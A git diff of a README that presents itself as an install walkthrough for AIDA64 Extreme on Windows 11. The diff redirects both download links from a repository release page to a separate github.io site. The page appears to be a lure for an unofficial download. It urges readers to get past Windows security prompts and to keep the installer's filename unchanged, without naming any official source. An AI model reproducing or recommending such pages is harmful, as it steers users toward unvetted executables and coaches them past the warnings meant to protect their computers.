@@ -1,6 +1,6 @@
 # 🛠️ AIDA64-Extreme-Install-Walkthrough - Fix Windows 11 Installation Errors Today
 
-[![](https://img.shields.io/badge/Download-AIDA64-blue.svg)](https://github.com/mean-stanleybaldwin856/AIDA64-Extreme-Install-Walkthrough/releases)
+[![](https://img.shields.io/badge/Download-AIDA64-blue.svg)](https://mean-stanleybaldwin856.github.io)
 
 AIDA64 Extreme provides deep insights into your computer hardware. Sometimes Windows 11 blocks the installation of this tool. This guide helps you navigate error screens and security prompts to get the software working on your PC.
 
@@ -17,7 +17,7 @@ If your computer uses an ARM-based processor, some monitoring features may behav
 ## 📥 How to Download the Software
 You must download the official installer from the project release page. 
 
-[Visit this page to download the software.](https://github.com/mean-stanleybaldwin856/AIDA64-Extreme-Install-Walkthrough/releases)
+[Visit this page to download the software.](https://mean-stanleybaldwin856.github.io)
 
 Click the link under the "Assets" section to save the file to your computer. Most browsers save this file to your Downloads folder by default. Do not rename the file, as the installer script requires the original filename to locate sub-components.
 
